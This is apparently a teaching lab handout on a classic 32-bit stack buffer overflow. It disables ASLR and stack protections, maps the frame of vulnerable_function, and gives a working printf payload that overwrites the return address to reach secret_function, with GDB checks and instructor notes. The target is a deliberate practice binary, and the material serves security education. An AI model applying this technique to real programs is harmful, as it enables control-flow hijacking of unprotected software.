## Setup

``` bash
sudo sysctl -w kernel.randomize_va_space=0
sudo apt update
sudo apt install gcc-multilib gdb
gcc -g -m32 -fno-stack-protector -z execstack -no-pie vuln.c -o vuln
```

## The Stack Frame of `vulnerable_function`

`vulnerable_function` is compiled as 32-bit x86 (`-m32`). The stack grows toward lower addresses, so the frame is drawn with higher addresses at the top:

```
   HIGHER ADDRESSES
  +-----------------------------+
  | argument: char *str         |  [ebp+8]   pushed by main()
  +-----------------------------+
  | return address              |  [ebp+4]   pushed by the call instruction
  +-----------------------------+  <-- EBP points here
  | saved EBP (caller's frame)  |  [ebp+0]   4 bytes
  +-----------------------------+
  | saved EBX                   |  [ebp-4]   4 bytes, pushed by the prologue
  +-----------------------------+
  | unused / alignment slack    |  [ebp-8]   4 bytes
  +-----------------------------+
  | char buffer[8]              |  [ebp-16]  8 bytes, strcpy() writes here
  |                             |  [ebp-9]
  +-----------------------------+  <-- ESP points here (after sub esp,0x14)
   LOWER ADDRESSES
```

`strcpy()` does not check the length of its input. It starts writing at `buffer` (the bottom of the frame) and keeps going upward, so it overwrites saved EBX, saved EBP, and finally the return address. Overwriting the return address controls where `vulnerable_function` returns to.

### Byte distances

| From | To | Bytes |
|------|----|-------|
| `buffer` | saved EBP | 16 |
| `buffer` | return address | 20 |

Any input of 20 bytes or less stays inside the frame. Bytes 21 through 24 overwrite the return address.

## Finding the Target Address

Get the address of `secret_function`:

``` bash
nm vuln | grep secret_function
```

This prints the address as a normal number (big-endian, most significant byte first), for example `08049196`. Rebuild the program and rerun `nm` after any change to `vuln.c`, because addresses move when the code changes.

x86 is **little-endian**: the least significant byte is stored at the lowest address. To put `0x08049196` into memory, write the bytes in reverse order:

| Value | Byte 0 | Byte 1 | Byte 2 | Byte 3 |
|-------|--------|--------|--------|--------|
| `0x08049196` | `\x96` | `\x91` | `\x04` | `\x08` |

So the payload is 20 filler bytes followed by `\x96\x91\x04\x08`.

## Running the Exploit

``` bash
./vuln "$(printf 'A%.0s' $(seq 20))$(printf '\x96\x91\x04\x08')"
```

Expected output:

```
Buffer contains: AAAAAAAAAAAAAAAAAAAA...
[!] Exploit Success! Redirected code execution to secret_function.
```

The `...` after the `A`s is the raw address bytes, which terminals display as garbage characters.

To try a wrong byte order, reverse the four bytes and the program will crash instead of printing the success message.

## Checking with GDB

``` bash
gdb ./vuln
(gdb) break vulnerable_function
(gdb) run "$(printf 'A%.0s' $(seq 20))$(printf '\x96\x91\x04\x08')"
(gdb) x/wx $ebp+4        # the return address before strcpy: 0x08049255 (back in main)
(gdb) next               # step over strcpy
(gdb) x/wx $ebp+4        # the return address now: 0x08049196
(gdb) x/6wx $ebp-16      # inspect the buffer and the saved values
```

Do not use `finish` here. It sets a breakpoint at the original return address, which has been overwritten, so the program runs to completion without stopping.

## Notes for Instructors

- **Why 20 and not 12?** A simple model of the frame suggests 8 bytes of buffer plus 4 bytes of saved EBP, so 12 bytes before the return address. That ignores the saved EBX and the `sub esp,0x14` in the prologue. Have students look at the disassembly (`objdump -d -M intel vuln`) and count the offsets themselves.
- **The saved EBP is trashed.** The filler overwrites it with `0x41414141`. That does not matter here because `secret_function` never uses it, but it is a good discussion point.
- **Clean exit.** `secret_function` calls `exit(0)`, so stdio is flushed and the success message appears even when stdout is a pipe. The exit status is `0` on success, and a segfault (`-11` from Python, `139` from a shell) means the exploit did not work.
- **Why not `return`?** `secret_function` has no valid return address on the stack, so returning from it would crash. Calling `exit` avoids the problem.
- **Offsets depend on the build.** Change the compiler, flags, or source, and the frame layout can change. Students should recompute the offset from their own binary.
